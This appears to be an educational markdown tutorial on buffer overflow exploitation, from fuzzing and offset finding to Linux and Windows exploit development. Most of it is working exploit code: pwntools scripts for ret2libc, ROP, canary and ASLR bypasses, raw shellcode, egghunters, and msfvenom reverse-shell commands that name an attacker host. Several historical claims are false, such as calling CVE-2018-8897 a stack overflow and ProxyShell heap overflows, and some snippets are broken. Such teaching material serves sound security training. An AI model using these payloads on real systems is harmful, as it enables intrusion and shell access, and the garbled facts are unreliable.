# Buffer Overflow

## Overview

Buffer overflows occur when a program writes more data to a buffer than it can hold, overwriting adjacent memory. This can lead to crashes, data corruption, or arbitrary code execution. First publicly documented in the 1988 Morris Worm, buffer overflows remain one of the most commonly exploited software vulnerabilities despite modern mitigations.

**Historical Impact**
- **Morris Worm (1988)**: Used a buffer overflow in `fingerd` to propagate across the early internet, infecting ~6,000 machines (10% of the internet at the time).
- **Code Red Worm (2001)**: Exploited a buffer overflow in Microsoft IIS 5.0, infecting over 359,000 systems in under 14 hours.
- **Heartbleed (2014)**: While a buffer over-read rather than overflow, it demonstrated how memory corruption affects even modern crypto libraries (OpenSSL).
- **EternalBlue (2017)**: Used by WannaCry and NotPetya ransomware, exploited a buffer overflow in Windows SMBv1, causing billions in damages.

## Types of Buffer Overflows

### Stack-Based Buffer Overflow

The stack is a contiguous block of memory used for function call management, local variables, and return addresses. It grows **downward** (from high to low memory addresses).

```
+------------------+  High Memory (0xffffffff)
|   Command Args   |
+------------------+
|  Environment     |
+------------------+
|     Stack        |  <- Grows downward (toward lower addresses)
|  +------------+  |
|  | Local Vars |  |
|  +------------+  |
|  | Saved EBP  |  |  <- Base pointer (frame pointer)
|  +------------+  |
|  | Return Addr|  |  <- CRITICAL: controls execution flow
|  +------------+  |
|  | Parameters |  |
|  +------------+  |
+------------------+
|      Heap        |  <- Grows upward (toward higher addresses)
+------------------+
|      BSS         |  <- Uninitialized static data
+------------------+
|      Data        |  <- Initialized static data
+------------------+
|      Text        |  <- Executable code (read-only)
+------------------+  Low Memory (0x00000000)
```

**Vulnerable Example (C)**
```c
#include <string.h>
#include <stdio.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc > 1)
        vulnerable(argv[1]);
    return 0;
}
```

When `input` exceeds 64 bytes, it overwrites the saved return address on the stack.

### Heap-Based Buffer Overflow

The heap is dynamically allocated memory managed by `malloc()`, `free()`, etc. Heap overflows corrupt metadata or adjacent objects, often leading to arbitrary write primitives rather than direct control flow hijacking.

**Vulnerable Example (C)**
```c
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
    char *buf1 = malloc(64);
    char *buf2 = malloc(64);
    
    // Overflow buf1 into buf2's metadata or data
    strcpy(buf1, argv[1]);  // No bounds check
    
    free(buf1);
    free(buf2);  // May crash due to corrupted metadata
}
```

**Real-World Heap Overflow**
- **Internet Explorer CVE-2012-4969 (2012)**: Use-after-free + heap spray, used in the wild for drive-by downloads.
- **Linux Kernel CVE-2016-6187 (2016)**: Heap overflow in AppArmor, local privilege escalation.

### Global Offset Table (GOT) and Procedure Linkage Table (PLT) Overwrites

Modern binaries use dynamic linking. The GOT stores actual function addresses after resolution; overwriting GOT entries can redirect function calls.

## Finding Buffer Overflows

### Fuzzing

Fuzzing is the primary method for discovering buffer overflows. It involves sending malformed or oversized inputs to a program and monitoring for crashes.

**Simple Fuzzing with Pattern Generation**
```bash
# Basic crash detection
python3 -c "print('A' * 1000)" | ./vulnerable_program
python3 -c "print('A' * 2000)" | ./vulnerable_program
python3 -c "print('A' * 5000)" | ./vulnerable_program

# Using AFL++ (American Fuzzy Lop)
afl-fuzz -i testcases/ -o findings/ -- ./vulnerable_program @@

# Using honggfuzz
honggfuzz -i input_dir -f input_file -- ./vulnerable_program ___FILE___

# Network service fuzzing with boofuzz
from boofuzz import *
session = Session(target=Target(connection=SocketConnection("192.168.1.100", 9999)))
s_initialize("test")
s_string("A"*1000)
s_send()
session.connect(s_get("test"))
session.fuzz()
```

### Pattern Creation and Offset Calculation

Metasploit's pattern system creates a unique, non-repeating sequence to precisely locate the overflow offset.

```bash
# Create a 1000-byte pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# Output: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1...

# Find offset after crash (EIP = 0x41326341)
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41326341 -l 1000
# Output: [*] Exact match at offset 76

# Using pwntools (Python)
from pwn import *
cyclic(1000)                # Create pattern
cyclic_find(0x61616174)     # Find offset
```

### GDB Analysis

GDB (GNU Debugger) is essential for analyzing crashes and developing exploits.

```bash
# Basic GDB commands
gdb ./vulnerable

# Set up debugging
(gdb) set disassembly-flavor intel
(gdb) set follow-fork-mode child

# Breakpoints
(gdb) b vulnerable_function
(gdb) b *0x0804842b

# Run with input
(gdb) run $(python3 -c "print('A'*100)")

# Post-crash analysis
(gdb) info registers
(gdb) x/100x $esp
(gdb) x/20i $eip
(gdb) bt full

# Examine memory protections
(gdb) checksec
# Or outside GDB:
checksec --file=./vulnerable
```

**GDB Enhancements (PEDA, GEF, pwndbg)**
```bash
# pwndbg (recommended for beginners)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# GEF (feature-rich)
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# PEDA (older but stable)
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

## Exploitation Techniques

### Classic Return Address Overwrite (Direct EIP Control)

The most straightforward exploit: overwrite the saved return address on the stack to redirect execution.

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './vulnerable'
elf = ELF(binary)

# Calculate offset via pattern offset or GDB
offset = 76

# Build payload - overwrite return address with target
# Target could be a function, shellcode, or ROP gadget
payload = b'A' * offset           # Padding to reach return address
payload += p32(0xdeadbeef)        # Overwrite return address

# Run exploit
p = process(binary)
p.sendline(payload)
p.interactive()
```

**Real Example**: The **Slapper Worm (2002)** used a stack buffer overflow in OpenSSL (CVE-2002-0656) to overwrite return addresses and execute shellcode on vulnerable Apache servers.

### Return to Shellcode (NX disabled)

When the stack is executable (rare on modern systems), you can place shellcode directly on the stack and jump to it.

```python
#!/usr/bin/env python3
from pwn import *

binary = './vulnerable'
offset = 76

# Shellcode: execve("/bin/sh", NULL, NULL)
# Linux x86
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Linux x86_64
shellcode_x64 = asm(shellcraft.amd64.sh())

# Windows x86 (calc.exe)
shellcode_win = b"\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\xb8\xc7\x93\xc2\x77\xff\xd0"

# NOP sled increases chance of hitting shellcode
nop_sled = b'\x90' * 100

# Address where shellcode will be placed (find via debugging)
shellcode_addr = 0xbffff200

# Build payload
payload = nop_sled + shellcode
payload += b'A' * (offset - len(payload))
payload += p32(shellcode_addr)

p = process(binary)
p.sendline(payload)
p.interactive()
```

**Historical Context**: The **Blaster Worm (2003)** used a stack buffer overflow in Windows RPC (CVE-2003-0352) with shellcode that spawned a shell and downloaded the worm.

### Return to libc (ret2libc) - Bypassing NX

When the stack is non-executable (NX), you can't run shellcode directly. Instead, return to existing libc functions like `system()`.

```python
#!/usr/bin/env python3
from pwn import *

# Bypass NX by chaining libc functions

binary = './vulnerable'
elf = ELF(binary)

# Need libc base address (ASLR may be disabled or we leak it)
# For demonstration, ASLR disabled
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc_base = 0xf7c00000

system_addr = libc_base + libc.symbols['system']
exit_addr = libc_base + libc.symbols['exit']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

offset = 76

# Stack layout for 32-bit:
# [padding][system][exit][arg0]
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)    # Optional: exit cleanly
payload += p32(binsh_addr)   # Argument to system()

p = process(binary)
p.sendline(payload)
p.interactive()
```

**Real-World ret2libc**: The **Linux kernel CVE-2014-4699** (2014) demonstrated ret2libc techniques against the kernel's ptrace subsystem, bypassing SMEP and SMAP.

### Return Oriented Programming (ROP)

ROP chains small instruction sequences ("gadgets") ending in `ret` to perform arbitrary computation. This bypasses NX and, with information leaks, ASLR.

```python
#!/usr/bin/env python3
from pwn import *

binary = './vulnerable'
elf = ELF(binary)
rop = ROP(elf)

# Find gadgets manually with ROPgadget or ropper
# ROPgadget --binary ./vulnerable | grep "pop rdi"
# 0x401234: pop rdi; ret
# 0x401236: pop rsi; ret
# 0x401238: pop rdx; ret

# Using pwntools ROP engine (automatically finds gadgets)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

# Stage 1: Leak libc address
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # Return for second stage

p = process(binary)
p.recvuntil(b'Input:')
p.send(payload)

leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leaked puts: {hex(leaked)}")

# Stage 2: Calculate libc base and call system
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A' * offset
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)

p.send(payload2)
p.interactive()
```

**Historical ROP Attack**: **JailbreakMe 3.0 (2011)** used ROP to jailbreak iOS 4.3.3, bypassing ASLR and NX on Apple's A4 processor.

### 64-bit Exploitation

x86_64 uses registers (RDI, RSI, RDX, RCX, R8, R9) for the first six arguments instead of the stack, requiring `pop` gadgets for each register.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './vulnerable64'
elf = ELF('./vulnerable64')

offset = 72  # 64-bit offset (varies by compiler)

# Find gadgets
pop_rdi = 0x401234   # pop rdi; ret
pop_rsi_r15 = 0x401236  # pop rsi; pop r15; ret (must pop r15 even if unused)

# Call execve("/bin/sh", NULL, NULL) - 64-bit syscall
# syscall number for execve: 59 (0x3b)
# Arguments: RDI = path, RSI = argv, RDX = envp

# Build ROP chain
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(next(elf.search(b'/bin/sh')))  # Find string in binary
payload += p64(pop_rsi_r15)
payload += p64(0)   # argv = NULL
payload += p64(0)   # r15 filler
payload += p64(pop_rdx)  # Need pop rdx gadget if available
payload += p64(0)   # envp = NULL
payload += p64(elf.address + 0x12345)  # Address of syscall gadget or system()

p = process('./vulnerable64')
p.sendline(payload)
p.interactive()
```

**64-bit Real Example**: **CVE-2017-7494 (SambaCry)** - A 64-bit buffer overflow in Samba allowed remote code execution via a crafted pipe name, exploited using ROP to disable SELinux and execute shellcode.

## Bypassing Protections

### ASLR Bypass (Address Space Layout Randomization)

ASLR randomizes base addresses of stack, heap, libraries, and sometimes the binary. Bypass requires an information leak.

**32-bit ASLR (Weak)**: Only 24 bits of entropy (16-19 bits in practice), vulnerable to brute force.

```python
# Brute force 32-bit ASLR (for services that restart on crash)
from pwn import *
import time

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh'))

# Try 2048 different libc base guesses
for i in range(2048):
    try:
        libc_base = 0xf7c00000 + (i * 0x1000)
        p = process('./vulnerable')
        p.sendline(exploit(libc_base))
        p.sendline(b'id\n')
        if b'uid=' in p.recv(timeout=1):
            log.success(f"Found libc base: {hex(libc_base)}")
            p.interactive()
            break
    except:
        p.close()
```

**64-bit ASLR (Strong)**: 28-32 bits of entropy, brute force impractical. Use information leak.

```python
# Information leak via format string or use-after-free
# Example: Leak a libc address from the stack

payload = b'%15$p.%16$p.%17$p'  # Format string leak
p.sendline(payload)
leaked = p.recv()
addresses = [int(x, 16) for x in leaked.split(b'.') if x.startswith(b'0x')]

# Calculate libc base from known offset
libc_base = addresses[0] - 0x24000  # Offset varies by libc version
```

**Real-World ASLR Bypass**: **CVE-2015-7547 (glibc getaddrinfo stack overflow)** - Used a DNS response to leak heap addresses and bypass ASLR, affecting most Linux distributions.

### Stack Canary Bypass

Stack canaries are random values placed between local variables and the return address. The program checks the canary before returning.

```c
// Compiler-inserted canary check
void function() {
    uintptr_t canary = __stack_chk_guard;
    char buffer[64];
    gets(buffer);  // Overflow here
    if (canary != __stack_chk_guard) __stack_chk_fail();
}
```

**Bypass Techniques**

1. **Information leak** - Read the canary via format string or out-of-bounds read
```python
# Format string leak of canary (stack position varies)
payload = b'%11$08x'  # Position where canary resides
p.sendline(payload)
canary = int(p.recv(8), 16)
log.info(f"Canary: {hex(canary)}")

# Then use correct canary in overflow
payload = b'A' * 64        # Fill buffer
payload += p32(canary)     # Correct canary
payload += b'A' * 12       # Padding to return address
payload += p32(system_addr)
```

2. **Brute force (forking servers)** - Try byte by byte since canary ends with null byte
```python
# Forking service (like old Apache) - canary resets each connection
canary = b''
for i in range(4):  # 4 bytes for 32-bit canary
    for byte in range(256):
        # Build payload with guessed canary bytes
        test = b'A'*64 + canary + bytes([byte])
        p = remote(target, port)
        p.send(test)
        if not crashed:
            canary += bytes([byte])
            break
```

3. **Overwrite stack variables only** - Don't touch the canary, target function pointers or adjacent variables
```c
struct {
    char buffer[64];
    void (*func_ptr)();
} data;

// Overflow into func_ptr without reaching canary
```

**Historical Canary Bypass**: **CVE-2010-0240 (Microsoft IE 8)** - Used a stack buffer overflow that overwrote a function pointer before the canary, bypassing GS (Windows' canary equivalent).

### NX/DEP Bypass (Non-Executable Stack)

NX/DEP marks stack and heap as non-executable. Bypass using:
- **ret2libc** (covered above)
- **ROP** (covered above)
- **ret2plt** (call functions via PLT without leaking libc)
- **mprotect** - If you can call mprotect() to make stack executable

```python
# Call mprotect to make stack executable, then jump to shellcode
# mprotect(addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)

pop_rdi = 0x401234
pop_rsi = 0x401236
pop_rdx = 0x401238

stack_page = 0xbffff000 & ~0xfff  # Page-aligned stack address
size = 0x2000
prot = 7  # PROT_READ|PROT_WRITE|PROT_EXEC (7)

payload = b'A' * offset
payload += p64(pop_rdi) + p64(stack_page)
payload += p64(pop_rsi) + p64(size)
payload += p64(pop_rdx) + p64(prot)
payload += p64(elf.symbols['mprotect'])  # Call mprotect
payload += p64(stack_page + len(payload))  # Return to shellcode
payload += shellcode
```

### PIE Bypass (Position Independent Executable)

PIE randomizes the binary base address. Bypass requires leaking a binary address.

```python
# Leak binary address from stack or via partial overwrite

# Partial overwrite - only change last 1-2 bytes of return address
# If binary is loaded at 0x55xxxxxx... and you only control lower bytes
payload = b'A' * offset
payload += b'\x12\x34'  # Overwrite only lower 2 bytes

# If you have an info leak:
p.sendline(b'%19$p')  # Leak code pointer from stack
leaked = int(p.recv().strip(), 16)
binary_base = leaked - 0x1234  # Subtract known offset
```

### Full Protection Bypass (ASLR + NX + PIE + Canary)

**Real-World Example**: **CVE-2018-8897 (Windows Kernel)** - A stack buffer overflow in the Windows kernel that bypassed SMEP, SMAP, KASLR, and CFG using a combination of ROP and information leaks.

```python
# Multi-stage exploit:
# Stage 1: Leak canary and libc address via format string
# Stage 2: Leak binary base via another pointer
# Stage 3: ROP chain to call system or mprotect
# Stage 4: Execute shellcode

def exploit_stage1():
    p.sendline(b'%15$p.%19$p.%35$p')
    leak = p.recv()
    canary, libc_leak, binary_leak = map(lambda x: int(x, 16), leak.split(b'.'))
    return canary, libc_leak, binary_leak

def exploit_stage2(canary, libc_base, binary_base):
    rop = ROP(binary_base)
    rop.call(libc_base + libc.symbols['system'], [libc_base + binsh_offset])
    
    payload = b'A' * 64
    payload += p64(canary)
    payload += b'A' * 8
    payload += rop.chain()
    
    p.send(payload)
    p.interactive()
```

## Format String Attacks

Format string vulnerabilities occur when user input is passed directly to `printf()`-family functions.

```c
// Vulnerable code
char buffer[256];
fgets(buffer, 256, stdin);
printf(buffer);  // WRONG - should be printf("%s", buffer)
```

### Reading Memory (Information Leak)

```python
# Leak stack values
payload = b'AAAA.%x.%x.%x.%x.%x'
p.sendline(payload)
# Output: AAAA.ffb2a1c.64.f7fc15a0.41414141.f7fc15a0

# Direct parameter access (%N$p)
payload = b'%7$p'  # Print 7th stack parameter
p.sendline(payload)
leaked = p.recv()

# Read from arbitrary address (supply address on stack)
address = 0x804c000  # GOT entry
payload = p32(address) + b'%7$s'  # Read string at address
p.sendline(payload)
```

### Writing Memory (Arbitrary Write)

```python
# Write 0xdeadbeef to address 0x804c000

# Method 1: Write 4 bytes at once (slow for large values)
address = 0x804c000
# %hn writes 2 bytes, %hhn writes 1 byte
payload = p32(address) + p32(address+2) + b'%49152x%8$hn%49152x%9$hn'

# Method 2: Using pwntools fmtstr module
from pwn import fmtstr
writes = {0x804c000: 0xdeadbeef}
payload = fmtstr.fmtstr_payload(offset=7, writes=writes, numbwritten=0)
```

**Real-World Format String**: **CVE-2012-0809 (sudo)** - A format string vulnerability in sudo's logging allowed local privilege escalation. **CVE-1999-0042 (wu-ftpd)** - One of the first widely exploited format string bugs.

## Windows Buffer Overflows

Windows exploitation differs significantly from Linux due to different calling conventions, protections (GS, SAFESEH, DEP, ASLR), and debugging tools.

### Environment Setup (Windows 7/10 for testing)

```powershell
# Disable protections for testing (not for production!)
bcdedit /set nx AlwaysOff  # Disable DEP
bcdedit /set {current} nx AlwaysOff

# Disable ASLR via registry
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management
# Set MoveImages = 0

# Compile with protections disabled
cl /GS- /Qfastfail- vulnerable.c
```

### Finding Bad Characters

Bad characters break payloads (null bytes, newlines, carriage returns, etc.). Identify them by sending all bytes and comparing memory.

```python
# Generate all possible bytes (0x00 to 0xff)
badchars = b''.join([bytes([i]) for i in range(1, 256)])  # Exclude null

# Send payload and examine memory in debugger
payload = b'A' * offset + badchars

# Common bad characters in Windows:
# 0x00 (null terminator - terminates strings)
# 0x0a (LF - ends command in some protocols)
# 0x0d (CR - ends command)
# 0xff (sometimes used as delimiter)
# 0x20 (space - argument separator in some protocols)
```

### JMP ESP Technique (Direct EIP Control)

When you control EIP and have a register pointing to your buffer, jump to that register.

```python
# Windows: find a JMP ESP or CALL ESP instruction in loaded modules
# Using mona.py in Immunity Debugger:
# !mona jmp -r esp -cpb "\x00\x0a\x0d"

import struct

offset = 2003
jmp_esp = struct.pack('<I', 0x625011af)  # JMP ESP from a DLL
nops = b'\x90' * 32

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f python -b "\x00\x0a\x0d"
shellcode = (
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    # ... full shellcode truncated for brevity
)

payload = b'A' * offset
payload += jmp_esp
payload += nops
payload += shellcode

p = process('./vulnerable.exe')
p.send(payload)
```

**Real-World JMP ESP**: **CVE-2003-0533 (LSASS Buffer Overflow)** - Used in the Sasser worm (2004). A JMP ESP from a system DLL directed execution to shellcode.

### Structured Exception Handler (SEH) Overwrite

Windows uses SEH for exception handling. Overwriting SEH structures provides an alternative control flow hijack when direct return address overwrite fails (e.g., GS cookie).

```python
# SEH structure on stack:
# [Buffer][nSEH (4 bytes)][SEH (4 bytes)][Return Address]
# nSEH = Next SEH record (typically a short jump)
# SEH = Pointer to exception handler

# Find POP POP RET gadget (bypasses SafeSEH)
# !mona seh -cpb "\x00\x0a\x0d"
# POP POP RET from a module without SafeSEH

offset_to_seh = 200  # Find via pattern

# nSEH: short jump to skip SEH and land in shellcode
nseh = b'\xeb\x06\x90\x90'  # JMP +6 bytes (over SEH)

# SEH: address of POP POP RET gadget
seh = struct.pack('<I', 0x10001234)

# Shellcode placed after SEH
shellcode = b"\x90" * 32 + msfvenom_shellcode

payload = b'A' * offset_to_seh
payload += nseh
payload += seh
payload += shellcode
```

**Real-World SEH Exploit**: **CVE-2010-3333 (Microsoft Office RTF Stack Overflow)** - Used SEH overwrite to bypass GS/DEP, affecting all versions of Office at the time.

### Egghunter

When buffer space is limited, use small egghunter shellcode to find a larger payload elsewhere in memory.

```python
# Egg: Unique 8-byte marker (repeated twice for safety)
egg = b'w00tw00t'

# Egghunter (32-bit Windows) - searches from 0x0 to 0x7ffeffff
egghunter = (
    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    b"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

# First stage (small buffer)
payload = b'A' * offset
payload += struct.pack('<I', jmp_esp)  # Jump to egghunter
payload += egghunter

# Second stage (placed in heap or other buffer)
# The egg must be placed before the real shellcode
payload2 = egg * 2 + shellcode  # Egg appears twice

p.send(payload2)  # Send second stage first
p.send(payload)   # Then trigger overflow
```

### Windows 10 Mitigations

Modern Windows (8/10/11) has extensive mitigations:
- **Control Flow Guard (CFG)**: Validates indirect call targets
- **Return Flow Guard (RFG)**: Protects return addresses
- **Arbitrary Code Guard (ACG)**: Prevents dynamic code generation
- **Code Integrity Guard (CIG)**: Only allows signed code

Bypasses require complex chains (e.g., CVE-2020-0986 - Windows Kernel EoP using CFG bypass).

## Useful Tools

### Exploitation Frameworks
```bash
# Pwntools (Python library for exploit development)
pip install pwntools

# Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && ./msfinstall

# Mona (Windows/Immunity Debugger)
# https://github.com/corelan/mona
!mona config -set workingfolder c:\logs\%p
```

### Binary Analysis
```bash
# checksec - Check binary protections
checksec --file=./vulnerable
checksec --file=/bin/ls

# ROPgadget - Find ROP gadgets
pip install ropgadget
ROPgadget --binary ./vulnerable | grep "pop rdi"
ROPgadget --binary ./vulnerable --ropchain

# Ropper - Alternative ROP gadget finder
pip install ropper
ropper -f ./vulnerable --search "pop rdi"
ropper -f ./vulnerable --chain "execve"

# one_gadget - Find execve("/bin/sh") gadgets in libc
gem install one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# angr - Symbolic execution for automatic ROP chain generation
pip install angr
```

### Debuggers
```bash
# GDB with pwndbg (Linux)
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

# GDB with GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# GDB with PEDA
git clone https://github.com/longld/peda.git ~/peda && echo "source ~/peda/peda.py" >> ~/.gdbinit

# Immunity Debugger (Windows)
# https://www.immunityinc.com/products/debugger/

# x64dbg (Windows modern alternative)
# https://x64dbg.com/

# WinDbg (Windows kernel debugging)
# Part of Windows SDK
```

### Fuzzing Tools
```bash
# AFL++ (American Fuzzy Lop)
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus && make install

# libFuzzer (LLVM)
clang -fsanitize=fuzzer,address -o target target.c

# honggfuzz
git clone https://github.com/google/honggfuzz
cd honggfuzz && make

# boofuzz (network fuzzing)
pip install boofuzz

# Spike (legacy network fuzzing)
wget https://github.com/guilhermeferreira/spikepp/archive/master.zip
```

### Shellcode Generation
```bash
# msfvenom (Metasploit)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python -b "\x00\x0a\x0d"
msfvenom -l payloads  # List all payloads
msfvenom -l encoders  # List encoders

# pwntools shellcraft
from pwn import *
print(shellcraft.amd64.sh())  # Print shellcode
print(asm(shellcraft.amd64.sh()))  # Binary shellcode

# Donut (position-independent shellcode from EXEs/DLLs)
donut -f payload.exe -o shellcode.bin
```

## Debugging Commands Reference

### GDB with pwndbg
```bash
gdb ./vulnerable
pwndbg> checksec                  # Check all protections
pwndbg> cyclic 200                # Generate cyclic pattern
pwndbg> r $(python3 -c "print('A'*100)")  # Run with input
pwndbg> cyclic -l $rsp            # Find offset
pwndbg> xinfo 0x7fffffffe000      # Examine address
pwndbg> search "/bin/sh"          # Search memory
pwndbg> vmmap                     # Memory mapping
pwndbg> telescope $rsp 20         # Examine stack
pwndbg> rop                       # Find ROP gadgets
pwndbg> nearpc                    # Disassemble around PC
```

### GDB with GEF
```bash
gef> pattern create 200
gef> pattern search $rsp
gef> vmmap
gef> xinfo 0x7ffff7c00000
gef> got
gef> plt
gef> shellcode search execve
gef> canary
```

### Immunity Debugger (Windows)
```bash
!mona config -set workingfolder c:\logs\%p
!mona pattern_create 2000
!mona pattern_offset 0x41326341
!mona jmp -r esp -cpb "\x00\x0a\x0d"
!mona seh -cpb "\x00\x0a\x0d"
!mona modules                # List loaded modules with protections
!mona find -type instr -s "jmp esp" -cm
```

## Practice Resources

### Beginner
- **Protostar** (https://exploit.education/protostar/) - Classic stack and heap overflows
- **pwnable.kr** (http://pwnable.kr/) - Tiered challenges from simple to advanced
- **OverTheWire Narnia** (https://overthewire.org/wargames/narnia/) - Basic binary exploitation

### Intermediate
- **ROP Emporium** (https://ropemporium.com/) - Dedicated to ROP techniques
- **pwnable.tw** (https://pwnable.tw/) - Real-world style challenges
- **Nightmare Course** (https://guyinatuxedo.github.io/) - Comprehensive free course
- **Binary Exploitation Notes** (https://github.com/apsdehal/binary-exploitation-notes)

### Advanced
- **Phoenix** (https://exploit.education/phoenix/) - Modern 64-bit challenges with all protections
- **CTF Pwn Problems** (https://github.com/ctf-wiki/ctf-challenges) - Archive of CTF challenges
- **How2Heap** (https://github.com/shellphish/how2heap) - Heap exploitation techniques
- **Windows Exploitation Tutorials** (https://github.com/CoreSecurity/exploit-writing-tutorials)

### Books
- **Hacking: The Art of Exploitation** (2nd Edition) - Jon Erickson
- **The Shellcoder's Handbook** (2nd/3rd Edition) - Chris Anley et al.
- **Practical Binary Analysis** - Dennis Andriesse
- **A Bug Hunter's Diary** - Tobias Klein

### Video Series
- **LiveOverflow Binary Exploitation** (https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- **Pwn College** (https://pwn.college/) - Arizona State University course
- **Open Security Training** (http://opensecuritytraining.info/) - Architecture 1001/x86_64

### CTF Platforms
- **PicoCTF** (https://picoctf.org/) - Beginner-friendly
- **CTFtime** (https://ctftime.org/) - Upcoming CTF events
- **HackTheBox** (https://www.hackthebox.com/) - Boxes with binary exploitation
- **VulnHub** (https://www.vulnhub.com/) - Vulnerable VMs for practice

## Real-World Vulnerability Timeline

| Year | Vulnerability | Impact | Technique Used |
|------|--------------|--------|----------------|
| 1988 | Morris Worm | ~6,000 hosts | Stack overflow in fingerd |
| 2001 | Code Red | 359,000+ hosts | IIS buffer overflow (heap) |
| 2003 | Blaster | 1 million+ hosts | Windows RPC stack overflow |
| 2004 | Sasser | Millions | LSASS overflow (SEH) |
| 2010 | Stuxnet | Iranian nuclear program | Multiple Windows zero-days including buffer overflows |
| 2014 | Heartbleed | 17% of internet servers | Buffer over-read (not overflow) |
| 2017 | EternalBlue/WannaCry | 300,000+ systems | Windows SMBv1 buffer overflow |
| 2021 | HAFNIUM/ProxyShell | ~60,000 Exchange servers | Heap overflows in IIS |

This document covers the complete landscape of buffer overflow exploitation from discovery to weaponization. Always practice in controlled environments and never on production systems without authorization.
